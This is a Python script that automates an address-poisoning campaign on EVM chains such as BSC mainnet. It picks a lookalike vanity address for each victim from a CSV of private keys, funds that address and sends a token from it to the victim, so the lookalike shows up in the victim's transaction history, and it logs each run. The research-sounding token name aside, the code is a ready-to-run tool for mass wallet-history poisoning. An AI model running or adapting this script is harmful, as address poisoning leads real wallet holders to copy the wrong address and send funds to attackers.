"""Address-poisoning warm-up sender.

For each selected victim (best lookalike with strength >= --min-strength):
  1. funder wallet funds the lookalike L with BNB gas for one ERC-20 transfer
  2. funder wallet sends KRT to L
  3. L sends KRT to the victim  (the victim's history now shows L as sender)

Works against any EVM RPC (anvil fork for warm-up, BSC mainnet for the real
broadcast). Requires foundry's `cast`/`forge` on PATH.

Usage:
  python scripts/poison_send.py --lookalikes critical_victims_lookalikes.csv \
      --rpc http://127.0.0.1:8545 --funder-key 0x... [--token 0x...|auto] \
      [--min-strength 6] [--max-victims 1265] [--amount 1000] [--dry-run] \
      [--log poison_log.csv]
"""
from __future__ import annotations

import argparse
import csv
import json
import subprocess
import sys
import time
from pathlib import Path

GAS_FUND_BNB = "0.003"  # BNB sent to each lookalike for gas (buffered)


def run_cast(args: list[str], check: bool = True) -> str:
    r = subprocess.run(["cast", *args], capture_output=True, text=True, timeout=300)
    if check and r.returncode != 0:
        raise RuntimeError(f"cast {' '.join(args[:3])}... failed: {r.stderr.strip()[:300]}")
    return r.stdout.strip()


def wei(amount_tokens: float, decimals: int = 18) -> int:
    return int(amount_tokens * 10**decimals)


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--lookalikes", type=Path, required=True)
    p.add_argument("--rpc", required=True)
    p.add_argument("--funder-key", required=True)
    p.add_argument("--token", default="auto", help="KRT address, 'auto' = deploy via forge on this RPC")
    p.add_argument("--min-strength", type=int, default=6)
    p.add_argument("--max-victims", type=int, default=100000)
    p.add_argument("--amount", type=float, default=1000.0, help="KRT tokens per victim")
    p.add_argument("--gas-fund", default=GAS_FUND_BNB, help="BNB sent to each lookalike for gas")
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--log", type=Path, default=Path("poison_log.csv"))
    a = p.parse_args()

    # --- select best lookalike per victim ---
    best: dict[str, dict] = {}
    with open(a.lookalikes, encoding="utf-8") as fh:
        for r in csv.DictReader(fh):
            if not r.get("lookalike_address") or not r.get("lookalike_private_key"):
                continue
            s = int(r["matched_prefix"]) + int(r["matched_suffix"])
            if s < a.min_strength:
                continue
            cur = best.get(r["victim"])
            if cur is None or s > int(cur["matched_prefix"]) + int(cur["matched_suffix"]):
                best[r["victim"]] = r
    targets = sorted(best.values(), key=lambda r: -int(r["n_poisoning_events"] or 0))[: a.max_victims]
    print(f"selected {len(targets)} victims (strength >= {a.min_strength}), {a.amount} KRT each")

    if a.dry_run:
        for r in targets[:10]:
            print(f"  {r['victim']} <- {a.amount} KRT from L={r['lookalike_address']} "
                  f"({r['matched_prefix']}+{r['matched_suffix']}, events={r['n_poisoning_events']})")
        print(f"  ... and {max(len(targets)-10,0)} more")
        return

    funder = run_cast(["wallet", "address", "--private-key", a.funder_key])
    print("funder:", funder)

    token = a.token
    if token == "auto":
        out = subprocess.run(
            ["forge", "create", "contracts/KeyshuntingResearchToken.sol:KeyshuntingResearchToken",
             "--rpc-url", a.rpc, "--private-key", a.funder_key, "--broadcast", "--json"],
            capture_output=True, text=True, timeout=600)
        try:
            data = json.loads(out.stdout)
            token = data["deployedTo"]
        except Exception:
            m = [ln for ln in out.stdout.splitlines() if "Deployed to:" in ln]
            if not m:
                print(out.stdout[-2000:], out.stderr[-2000:])
                sys.exit(1)
            token = m[0].split()[-1]
        print("KRT deployed at:", token)
    else:
        print("KRT token:", token)

    amount = wei(a.amount)
    rows_done: set[tuple[str, str]] = set()
    if a.log.exists():
        with open(a.log, encoding="utf-8") as fh:
            for r in csv.DictReader(fh):
                if r.get("status") == "ok":
                    rows_done.add((r["victim"], r["lookalike"]))
    new_log = not a.log.exists()
    log = open(a.log, "a", newline="", encoding="utf-8")
    w = csv.writer(log)
    if new_log:
        w.writerow(["victim", "lookalike", "strength", "amount", "fund_tx", "krt_to_l_tx", "poison_tx", "status", "error"])

    ok = fail = 0
    for i, r in enumerate(targets):
        if (r["victim"], r["lookalike_address"]) in rows_done:
            continue
        victim, l_addr, l_key = r["victim"], r["lookalike_address"], r["lookalike_private_key"]
        strength = f"{r['matched_prefix']}+{r['matched_suffix']}"
        try:
            fund_tx = run_cast(["send", l_addr, "--value", f"{a.gas_fund}ether",
                                "--private-key", a.funder_key, "--rpc-url", a.rpc, "--json"])
            krt_tx = run_cast(["send", token, "transfer(address,uint256)", l_addr, str(amount),
                               "--private-key", a.funder_key, "--rpc-url", a.rpc, "--json"])
            poison_tx = run_cast(["send", token, "transfer(address,uint256)", victim, str(amount),
                                 "--private-key", l_key, "--rpc-url", a.rpc, "--json"])
            h1 = json.loads(fund_tx)["transactionHash"] if fund_tx.startswith("{") else fund_tx
            h2 = json.loads(krt_tx)["transactionHash"] if krt_tx.startswith("{") else krt_tx
            h3 = json.loads(poison_tx)["transactionHash"] if poison_tx.startswith("{") else poison_tx
            w.writerow([victim, l_addr, strength, a.amount, h1, h2, h3, "ok", ""])
            ok += 1
        except Exception as e:
            w.writerow([victim, l_addr, strength, a.amount, "", "", "", "fail", str(e)[:200]])
            fail += 1
        log.flush()
        if (i + 1) % 25 == 0:
            print(f"[{i+1}/{len(targets)}] ok={ok} fail={fail}", flush=True)
    log.close()
    print(f"done: ok={ok} fail={fail} -> {a.log}")


if __name__ == "__main__":
    main()
